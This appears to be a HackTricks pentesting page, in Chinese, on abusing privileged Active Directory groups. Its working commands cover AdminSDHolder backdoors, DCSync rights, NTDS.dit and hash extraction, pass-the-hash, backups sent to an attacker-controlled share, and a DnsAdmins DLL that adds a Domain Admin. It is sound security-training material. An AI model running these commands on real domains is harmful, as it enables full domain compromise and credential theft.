# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 具有管理权限的知名组

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

该组有权在域中创建非管理员账户和组。此外，它还允许本地登录 Domain Controller (DC)。

要识别该组的成员，可以执行以下命令：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
允许添加新用户，并且允许在 DC 上进行本地登录。<sup>[[1]](#references)</sup>

## AdminSDHolder 组

**AdminSDHolder** 组的 Access Control List (ACL) 至关重要，因为它为 Active Directory 中的所有“受保护组”（包括高权限组）设置权限。此机制通过防止未经授权的修改来确保这些组的安全。

攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，为标准用户授予完全权限。这实际上会使该用户完全控制所有受保护组。如果该用户的权限被更改或移除，由于系统的设计，这些权限会在一小时内自动恢复。<sup>[[14]](#references)</sup>

最新的 Windows Server 文档仍将多个内置 operator 组视为**受保护**对象（`Account Operators`、`Backup Operators`、`Print Operators`、`Server Operators`、`Domain Admins`、`Enterprise Admins`、`Key Admins`、`Enterprise Key Admins` 等）。默认情况下，**SDProp** 进程每 60 分钟在 **PDC Emulator** 上运行一次，为受保护对象设置 `adminCount=1`，并禁用继承。对于持久化和排查已从受保护组中移除但仍保留非继承 ACL 的过时特权用户而言，这都非常有用。<sup>[[12]](#references)</sup>

用于查看成员并修改权限的命令包括：
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
可使用以下脚本来加快还原过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

如需更多详细信息，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。<sup>[[14]](#references)</sup>

## AD 回收站

成为该组的成员后，可以读取已删除的 Active Directory 对象，从而可能泄露敏感信息：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
这对于**恢复以前的权限路径**很有用。已删除的对象仍可能暴露 `lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、旧的 SPN，或已删除特权组的 DN，而该组之后可能被另一名操作员恢复。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### 域控制器访问

除非用户属于 `Server Operators` 组，否则对 DC 上文件的访问会受到限制；属于该组会改变访问级别。

### 权限提升

使用 Sysinternals 中的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权限，从而允许执行任意命令并进行权限提升：<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
此命令显示 `Server Operators` 具有完全访问权限，从而能够操纵服务以获取提升的权限。

## Backup Operators

加入 `Backup Operators` 组后，由于拥有 `SeBackup` 和 `SeRestore` 权限，用户可以访问 `DC01` 文件系统。这些权限即使在没有显式权限的情况下，也能借助 `FILE_FLAG_BACKUP_SEMANTICS` 标志实现文件夹遍历、目录列举和文件复制功能。此过程需要使用特定的 scripts。<sup>[[1]](#references)</sup>

要列出组成员，请执行：
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 本地攻击

要在本地利用这些权限，需执行以下步骤：

1. 导入必要的库：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. 启用并验证 `SeBackupPrivilege`：
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 访问并复制受限目录中的文件，例如：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

直接访问 Domain Controller 的文件系统可以窃取 `NTDS.dit` 数据库，其中包含域用户和计算机的所有 NTLM 哈希。

#### 使用 diskshadow.exe

1. 创建 `C` 驱动器的卷影副本：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 从卷影副本中复制 `NTDS.dit`：
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
或者，使用 `robocopy` 进行文件复制：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 提取 `SYSTEM` 和 `SAM` 以获取哈希值：
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. 从 `NTDS.dit` 中获取所有哈希：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 提取后：Pass-the-Hash 到 DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### 使用 wbadmin.exe

1. 在攻击者机器上为 SMB server 设置 NTFS filesystem，并在目标机器上缓存 SMB credentials。
2. 使用 `wbadmin.exe` 进行系统备份并提取 `NTDS.dit`：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

如需实际演示，请参阅 [使用 IPPSEC 的演示视频](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)。

## DnsAdmins

**DnsAdmins** 组成员可以利用其权限，在 DNS server 上以 SYSTEM 权限加载任意 DLL，而 DNS server 通常托管在 Domain Controllers 上。此能力具有很大的 exploitation 潜力。

要列出 DnsAdmins 组的成员，请使用：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 执行任意 DLL（CVE‑2021‑40469）

> [!NOTE]
> 此漏洞允许在 DNS 服务中以 SYSTEM 权限执行任意代码（通常位于 DC 中）。此问题已于 2021 年修复。

成员可以使用如下命令，让 DNS 服务器加载任意 DLL（本地 DLL 或来自远程共享的 DLL）：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
重启 DNS 服务（可能需要额外权限）是 DLL 被加载所必需的：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
有关此攻击向量的更多详细信息，请参阅 ired.team。

#### Mimilib.dll

也可以使用 mimilib.dll 执行命令，通过修改它来执行特定命令或 reverse shell。[查看此文章](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 以了解更多信息。<sup>[[15]](#references)</sup>

### WPAD 记录用于 MitM

DnsAdmins 可以在禁用全局查询阻止列表后创建 WPAD 记录，从而操纵 DNS 记录并执行 Man-in-the-Middle (MitM) 攻击。可以使用 Responder 或 Inveigh 等工具进行 spoofing 并捕获网络流量。

### Event Log Readers
成员可以访问事件日志，从中可能发现明文密码或命令执行详细信息等敏感信息：
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

此组可以修改域对象上的 DACL，从而可能授予 DCSync 权限。利用此组进行权限提升的技术详见 Exchange-AD-Privesc GitHub repo。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
如果你能够以该组成员身份行事，经典的滥用方式是授予攻击者控制的主体执行 [DCSync](dcsync.md) 所需的复制权限：
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
历史上，**PrivExchange** 通过串联 mailbox access、强制 Exchange authentication 和 LDAP relay，最终获得了相同的 primitive。即使该 relay 路径已得到缓解，直接属于 `Exchange Windows Permissions`，或控制 Exchange server，仍然是获取域复制权限的高价值途径。

## Hyper-V Administrators

Hyper-V Administrators 对 Hyper-V 拥有完全访问权限，可利用这些权限控制虚拟化的 Domain Controllers。这包括克隆运行中的 DC，以及从 `NTDS.dit` 文件中提取 NTLM hashes。

### Exploitation Example

实际滥用通常是对 DC 磁盘或 checkpoint 进行**离线访问**，而不是利用旧式的 host-level LPE 技巧。获得 Hyper-V host 的访问权限后，operator 可以对虚拟化的 Domain Controller 创建 checkpoint 或将其导出，挂载 VHDX，并提取 `NTDS.dit`、`SYSTEM` 以及其他 secrets，而无需接触 guest 内部的 LSASS：
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
从这里开始，复用 `Backup Operators` 工作流，以离线方式复制 `Windows\NTDS\ntds.dit` 和注册表 hive。

## Group Policy Creators Owners

该组允许成员在域中创建 Group Policy。不过，其成员无法将组策略应用于用户或组，也无法编辑现有的 GPO。

其中一个重要细节是，**创建者会成为新 GPO 的所有者**，通常随后会获得足够的权限来编辑该 GPO。这意味着，当你可以执行以下操作之一时，该组就很值得关注：

- 创建恶意 GPO，并说服管理员将其链接到目标 OU 或域
- 编辑由你创建且已链接到有用位置的 GPO
- 滥用另一项允许你链接 GPO 的委派权限，而该组则为你提供编辑权限

实际滥用通常意味着通过由 SYSVOL 支持的策略文件添加 **Immediate Task**、**startup script**、**local admin membership** 或 **user rights assignment** 更改。<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
如果通过 `SYSVOL` 手动编辑 GPO，请记住，仅进行此更改是不够的：还必须更新 `versionNumber`、`GPT.ini`，有时还需要更新 `gPCMachineExtensionNames`，否则客户端将忽略策略刷新。<sup>[[9]](#references)</sup>

## Organization Management

在部署了 **Microsoft Exchange** 的环境中，一个名为 **Organization Management** 的特殊组拥有重要权限。该组有权**访问所有域用户的邮箱**，并对 **'Microsoft Exchange Security Groups'** Organizational Unit (OU) 保持**完全控制权**。此控制权包括 **`Exchange Windows Permissions`** 组，该组可被利用来进行 privilege escalation。

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** 组的成员拥有多项权限，包括 **`SeLoadDriverPrivilege`**，该权限允许其**在 Domain Controller 上本地登录**、关闭 Domain Controller 以及管理打印机。要利用这些权限，尤其是在未提升权限的上下文中看不到 **`SeLoadDriverPrivilege`** 时，必须绕过 User Account Control (UAC)。<sup>[[1]](#references)</sup>

要列出该组的成员，可使用以下 PowerShell 命令：
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
在 Domain Controllers 上，此组很危险，因为默认的 Domain Controller Policy 会向 **`SeLoadDriverPrivilege`** 授予 `Print Operators`。如果你获得了该组成员的 elevated token，就可以启用此 privilege，并加载一个已签名但存在漏洞的 driver，从而跳转到 kernel/SYSTEM。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> 有关 token 处理的详细信息，请查看 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)。

#### Remote Desktop Users

此组的成员可通过 Remote Desktop Protocol (RDP) 访问 PC。可以使用 PowerShell 命令枚举这些成员：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
有关利用 RDP 的更多见解，可在专门的 pentesting 资源中找到。

#### Remote Management Users

成员可以通过 **Windows Remote Management (WinRM)** 访问 PC。可通过以下方式枚举这些成员：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
对于与 **WinRM** 相关的 exploitation techniques，应查阅专门的文档。

#### Server Operators

该组拥有在 Domain Controllers 上执行各种配置的权限，包括备份和还原权限、修改系统时间以及关闭系统。<sup>[[1]](#references)</sup>要枚举其成员，可使用以下命令：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
在 Domain Controllers 上，`Server Operators` 通常继承了足够的权限，可以**重新配置或启动/停止服务**，并且还会通过默认 DC 策略获得 `SeBackupPrivilege`/`SeRestorePrivilege`。实际上，这使他们成为**服务控制滥用**与 **NTDS 提取**之间的桥梁：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
如果 service ACL 授予该组更改/启动权限，可以将 service 指向任意命令，以 `LocalSystem` 身份启动，然后恢复原始的 `binPath`。如果 service control 被锁定，则回退使用上述 `Backup Operators` 技术复制 `NTDS.dit`。

## References

- [1] [ired.team – 特权账户和 Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – 滥用 SeLoadDriverPrivilege 进行 Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – 滥用 GPO Permissions](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse，第 1 部分（Internet Archive）](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver（ntloaddriver.cpp）](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver（eoploaddriver.cpp）](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit（Capcom.sys）](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Red Teamer 的 GPO 和 OU 指南](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 函数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 附录 C：Active Directory 中的受保护账户和组](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – 如何滥用并后门化 AdminSDHolder 以获得 Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – 滥用 DnsAdmins Privilege 在 Active Directory 中进行 Escalation](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge abuse information](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 函数（Internet Archive）](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
